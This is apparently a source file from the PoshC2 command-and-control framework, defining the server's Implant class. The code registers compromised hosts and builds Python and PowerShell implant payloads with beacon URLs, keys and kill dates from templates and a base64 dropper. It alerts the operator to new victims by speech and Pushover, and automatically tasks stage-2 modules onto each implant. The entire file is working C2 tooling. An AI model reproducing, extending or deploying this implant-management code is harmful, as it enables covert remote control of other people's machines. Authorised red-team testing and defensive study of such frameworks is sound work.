import urllib, base64, datetime, http.client

from poshc2.Colours import Colours
from poshc2.Utils import randomuri, gen_key
from poshc2.server.Config import PayloadsDirectory, PayloadTemplatesDirectory, Jitter, Sounds, NotificationsProjectName, DatabaseType
from poshc2.server.Core import get_images
from poshc2.server.AutoLoads import run_autoloads

if DatabaseType.lower() == "postgres":
    from poshc2.server.database.DBPostgres import select_item, get_defaultbeacon, get_killdate, get_dfheader, get_otherbeaconurls, get_defaultuseragent, new_implant, new_task, update_mods, get_autoruns, get_notificationstatus
else:
    from poshc2.server.database.DBSQLite import select_item, get_defaultbeacon, get_killdate, get_dfheader, get_otherbeaconurls, get_defaultuseragent, new_implant, new_task, update_mods, get_autoruns, get_notificationstatus


class Implant(object):

    def __init__(self, ipaddress, pivot, domain, user, hostname, arch, pid, proxy):
        self.RandomURI = randomuri()
        self.Label = None
        self.User = user
        self.Hostname = hostname
        self.IPAddress = ipaddress
        self.Key = gen_key().decode("utf-8")
        self.FirstSeen = (datetime.datetime.now()).strftime("%d/%m/%Y %H:%M:%S")
        self.LastSeen = (datetime.datetime.now()).strftime("%d/%m/%Y %H:%M:%S")
        self.PID = pid
        self.Proxy = proxy
        self.Arch = arch
        self.Domain = domain
        self.DomainFrontHeader = get_dfheader()
        self.Alive = "Yes"
        self.UserAgent = get_defaultuseragent()
        self.Sleep = get_defaultbeacon()
        self.ModsLoaded = ""
        self.Jitter = Jitter
        self.ImplantID = ""
        self.Pivot = pivot
        self.KillDate = get_killdate()
        self.ServerURL = select_item("PayloadCommsHost", "C2Server")
        self.AllBeaconURLs = get_otherbeaconurls()
        self.AllBeaconImages = get_images()
        self.SharpCore = """
RANDOMURI19901%s10991IRUMODNAR
URLS10484390243%s34209348401SLRU
KILLDATE1665%s5661ETADLLIK
SLEEP98001%s10089PEELS
JITTER2025%s5202RETTIJ
NEWKEY8839394%s4939388YEKWEN
IMGS19459394%s49395491SGMI""" % (self.RandomURI, self.AllBeaconURLs, self.KillDate, self.Sleep, self.Jitter, self.Key, self.AllBeaconImages)
        with open("%spy_dropper.sh" % (PayloadsDirectory), 'rb') as f:
            self.PythonImplant = base64.b64encode(f.read()).decode("utf-8")
        py_implant_core = open("%s/Implant-Core.py" % PayloadTemplatesDirectory, 'r').read()
        self.PythonCore = py_implant_core % (self.DomainFrontHeader, self.Sleep, self.AllBeaconImages, self.AllBeaconURLs, self.KillDate, self.PythonImplant, self.Jitter, self.Key, self.RandomURI, self.UserAgent)
        ps_implant_core = open("%s/Implant-Core.ps1" % PayloadTemplatesDirectory, 'r').read()
        self.PSCore = ps_implant_core % (self.Key, self.Jitter, self.Sleep, self.AllBeaconImages, self.RandomURI, self.RandomURI, self.KillDate, self.AllBeaconURLs)  # Add all db elements def display(self):
    # Add all db elements

    def display(self):
        print(Colours.GREEN, "")
        it = self.Pivot
        print("[%s] New %s implant connected: (uri=%s key=%s)" % (self.ImplantID, it, self.RandomURI, self.Key))
        print("%s | Time:%s | PID:%s | Sleep:%s | %s (%s) | URL:%s" % (self.IPAddress, self.FirstSeen, str(self.PID), str(self.Sleep), (str(self.User) + " @ " + str(self.Hostname)), self.Arch, self.Proxy))
        EnableNotifications = get_notificationstatus()

        try:
            if Sounds.lower().strip() == "yes":
                import pyttsx3
                engine = pyttsx3.init()
                rate = engine.getProperty('rate')
                engine.setProperty('voice', "english-us")
                engine.setProperty('rate', rate - 30)
                engine.say("Nice, we have an implant")
                engine.runAndWait()
        except Exception:
            pass

        try:
            Pushover_APIToken = select_item("Pushover_APIToken", "C2Server")
            Pushover_APIUser = select_item("Pushover_APIUser", "C2Server")

            if EnableNotifications.lower().strip() == "yes":
                conn = http.client.HTTPSConnection("api.pushover.net:443")
                conn.request("POST", "/1/messages.json",
                            urllib.parse.urlencode({
                                "token": Pushover_APIToken,
                                "user": Pushover_APIUser,
                                "message": "[%s] - NewImplant: %s @ %s" % (NotificationsProjectName, self.User, self.Hostname),
                            }), {"Content-type": "application/x-www-form-urlencoded"})

                output = conn.getresponse()
                if output.status != 200:
                    data = output.read()
                    print("\nPushover error: ")
                    print(data)
        except Exception as e:
            print("Pushover send error: %s" % e)

    def save(self):
        self.ImplantID = new_implant(self.RandomURI, self.User, self.Hostname, self.IPAddress, self.Key, self.FirstSeen, self.FirstSeen, self.PID, self.Proxy, self.Arch, self.Domain, self.Alive, self.Sleep, self.ModsLoaded, self.Pivot, self.Label)

    def autoruns(self):
        if "C#" in self.Pivot:
            new_task("loadmodule Stage2-Core.exe", "autoruns", self.RandomURI)
            update_mods("Stage2-Core.exe", self.RandomURI)
        if "PS" in self.Pivot:
            new_task("loadmodule Stage2-Core.ps1", "autoruns", self.RandomURI)
            update_mods("Stage2-Core.ps1", self.RandomURI)
        result = get_autoruns()
        if result:
            for autorun in result:
                run_autoloads(autorun[1], self.RandomURI, "autoruns")
                new_task(autorun[1], "autoruns", self.RandomURI)
